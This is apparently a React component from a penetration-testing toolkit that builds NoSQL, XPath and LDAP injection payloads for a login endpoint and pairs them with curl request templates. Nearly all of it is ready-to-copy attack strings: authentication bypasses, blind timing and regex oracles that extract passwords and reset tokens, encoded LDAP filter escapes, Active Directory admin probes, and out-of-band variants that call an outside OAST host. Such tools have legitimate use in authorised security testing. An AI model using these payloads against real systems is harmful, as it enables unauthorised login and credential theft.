import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  CodeBlock,
  CopyChip,
  DownloadButton,
  KVTable,
  SectionTitle,
  Tabs,
  TextInput,
} from '@/components/ui';
import { DEFAULT_OOB_DOMAIN, DEFAULT_TARGET } from '@/tools/registry';

type Family = 'mongo' | 'xpath' | 'ldap';

const FAMILIES: Array<{ value: Family; label: string; where: string; ctype: string }> = [
  { value: 'mongo', label: 'MongoDB', where: 'JSON body field, query-string param cast to object, or a form field that reaches {$ne:...}', ctype: 'application/json' },
  { value: 'xpath', label: 'XPath', where: 'Username/password fields passed straight into an XPath expression (count() oracle)', ctype: 'application/x-www-form-urlencoded' },
  { value: 'ldap', label: 'LDAP', where: 'Search filter built by string concatenation, e.g. (&(uid=USER)(userPassword=PASS))', ctype: 'application/x-www-form-urlencoded' },
];

type Group = { title: string; note?: string; items: string[] };

function mongo(oast: string): Group[] {
  return [
    {
      title: 'Operator injection',
      note: 'Send as a nested object, not a string',
      items: [
        `{"$ne":null}`,
        `{"$gt":""}`,
        `{"$ne":"x"}`,
        `{"$in":["admin","root"]}`,
        `{"$regex":"^a"}`,
        `{"$exists":true}`,
        `{"$where":"1==1"}`,
      ],
    },
    {
      title: 'Array injection (form → object coercion)',
      note: 'Many frameworks turn username[$ne]=1 into the object form',
      items: [`username[$ne]=1&password[$ne]=1`, `username[$gt]=&password[$gt]=`, `user[$regex]=^adm&pass[$ne]=1`],
    },
    {
      title: 'Blind / timing',
      note: 'Requires the $where or $function evaluator to be reachable',
      items: [
        `{"$where":"sleep(5000) || 1==1"}`,
        `{"$where":"function(){var d=new Date();do{var x=1;}while(new Date()-d<5000);return true;}"}`,
        `{"$regex":"^a","$options":"im"}`,
        `';return true;var x='`,
      ],
    },
    {
      title: 'Extraction oracle',
      note: 'Character-by-character via regex against the reset token or password field',
      items: [
        `{"username":"admin","password":{"$regex":"^a"}}`,
        `{"username":"admin","token":{"$regex":"^[a-f0-9]{1}$"}}`,
        `{"$where":"this.username=='admin' && /^a/.test(this.password)"}`,
      ],
    },
    {
      title: 'Out-of-band',
      note: 'Only fires if server-side JS can reach the network',
      items: [`{"$where":"fetch('http://${oast}/x')||1==1"}`, `{"$where":"require('http').get('http://${oast}/y')"}`],
    },
  ];
}

function xpath(oast: string): Group[] {
  return [
    {
      title: 'Authentication bypass',
      items: [`' or '1'='1`, `' or 1=1 or ''='`, `admin' or '1'='1' or 'a'='a`, `' or count(//user)>0 or 'a'='b`],
    },
    {
      title: 'Node walk / count oracle',
      note: 'count() returns an int; compare with numeric thresholds for blind extraction',
      items: [
        `' or count(//user)>0 or 'a'='b`,
        `' or count(//user[position()=1]/password)>5 or 'a'='b`,
        `' or string-length(//user[1]/password)>8 or 'a'='b`,
        `' or substring(//user[1]/password,1,1)='a' or 'a'='b`,
        `' or name(/*)='users' or 'a'='b`,
      ],
    },
    {
      title: 'Error-based probing',
      items: [`' or 1 div 0 or 'a'='b`, `') or ('1'='1`, `]]>'" or "1"="1`],
    },
    {
      title: 'Out-of-band',
      items: [`' or doc('http://${oast}/x') or 'a'='b`, `' or unparsed-text('http://${oast}/y') or 'a'='b`],
    },
  ];
}

function ldap(): Group[] {
  return [
    {
      title: 'Filter injection',
      note: 'Break out of the enclosing parentheses first',
      items: [`*`, `*)(uid=*`, `*)(|(uid=*))(`, `*)(&(uid=*)(userPassword=*)`, `admin*`, `admin)(&)`, `\\2a`, `*))(|(cn=*`],
    },
    {
      title: 'Filter escape / encoding',
      note: 'Hex escapes survive input sanitisation that only strips literal parens',
      items: [`\\28uid=\\2a\\29`, `\\2a\\29\\28uid=\\2a`, `\\2a\\29\\28|\\28mail=\\2a\\29`, `%2a%29%28uid%3d%2a`],
    },
    {
      title: 'Blind timing',
      note: 'Only works if the filter is evaluated against an LDAP proxy with a delay side channel',
      items: [`*)(uid=*)(|(uid=*)(sleep=5)`, `admin)(|(userPassword=x*)(description=*`, `*)(objectClass=person`],
    },
    {
      title: 'Attribute oracle',
      items: [`*)(sAMAccountName=Administrator`, `*)(userAccountControl:1.2.840.113556.1.4.803:=512`, `*)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local`],
    },
  ];
}

export default function NoSqlInjectionBuilder() {
  const [family, setFamily] = useState<Family>('mongo');
  const [url, setUrl] = useState(`https://${DEFAULT_TARGET}/api/login`);
  const [field, setField] = useState('username');
  const [oast, setOast] = useState(DEFAULT_OOB_DOMAIN);

  const groups = useMemo<Group[]>(() => {
    const h = oast.trim() || DEFAULT_OOB_DOMAIN;
    if (family === 'mongo') return mongo(h);
    if (family === 'xpath') return xpath(h);
    return ldap();
  }, [family, oast]);

  const meta = FAMILIES.find((f) => f.value === family)!;
  const flat = groups.map((g) => [`# ${g.title}`, ...g.items, ''].join('\n')).join('\n');

  const curl = useMemo(() => {
    const u = url.trim() || `https://${DEFAULT_TARGET}/api/login`;
    if (family === 'mongo') {
      return [
        `curl -sS -i '${u}' \\`,
        `  -H 'Content-Type: ${meta.ctype}' \\`,
        `  -d '{"${field || 'username'}":{"$ne":null},"password":{"$ne":null}}'`,
        ``,
        `# string coercion via query param`,
        `curl -sS -i '${u}?${field || 'username'}[$ne]=1&password[$ne]=1'`,
      ].join('\n');
    }
    const payload = family === 'xpath' ? `' or '1'='1` : `*)(uid=*`;
    return [
      `curl -sS -i '${u}' \\`,
      `  -H 'Content-Type: ${meta.ctype}' \\`,
      `  --data-urlencode '${field || 'username'}=${payload}' \\`,
      `  --data-urlencode 'password=x'`,
    ].join('\n');
  }, [family, url, field, meta]);

  return (
    <>
      <Card title="Family">
        <Tabs value={family} onChange={setFamily} tabs={FAMILIES.map((f) => ({ value: f.value, label: f.label }))} />
        <div className="mt-4 grid gap-4 sm:grid-cols-2">
          <TextInput label="Endpoint" value={url} onChange={setUrl} mono />
          <TextInput label="Injected field / param" value={field} onChange={setField} mono />
          <TextInput label="OAST domain" value={oast} onChange={setOast} mono hint="Used by out-of-band variants" />
        </div>
        <div className="mt-4">
          <KVTable
            rows={[
              ['Where it is submitted', meta.where],
              ['Content-Type', meta.ctype],
              ['Parser trap', family === 'mongo' ? 'A quoted string never becomes an operator — force object coercion via brackets or JSON' : 'Break out of the enclosing expression before injecting'],
            ]}
          />
        </div>
      </Card>

      <Card title={`${meta.label} payloads`} action={<DownloadButton text={flat} filename={`${family}-payloads.txt`} label="Download .txt" />}>
        <div className="flex flex-col gap-5">
          {groups.map((g) => (
            <div key={g.title}>
              <SectionTitle>{g.title}</SectionTitle>
              {g.note && <p className="mt-0 mb-2 text-[11.5px] text-[var(--text-faint)]">{g.note}</p>}
              <div className="flex flex-col gap-1.5">
                {g.items.map((p, i) => (
                  <CopyChip key={i} text={p} />
                ))}
              </div>
            </div>
          ))}
        </div>
      </Card>

      <Card title="Request">
        <CodeBlock code={curl} label="curl" />
        <div className="mt-4">
          <Callout tone="info" title="Confirming a hit">
            MongoDB: <span className="rf-mono">{'{"$ne":null}'}</span> returns 200 with a session when the true/false pair
            flips the response. XPath: the count() oracle returns a numeric threshold response. LDAP: a wildcard in the
            filter returns every directory entry — compare with an exact-match request. Record the boolean pair as evidence
            rather than relying on a single successful login.
          </Callout>
        </div>
      </Card>
    </>
  );
}
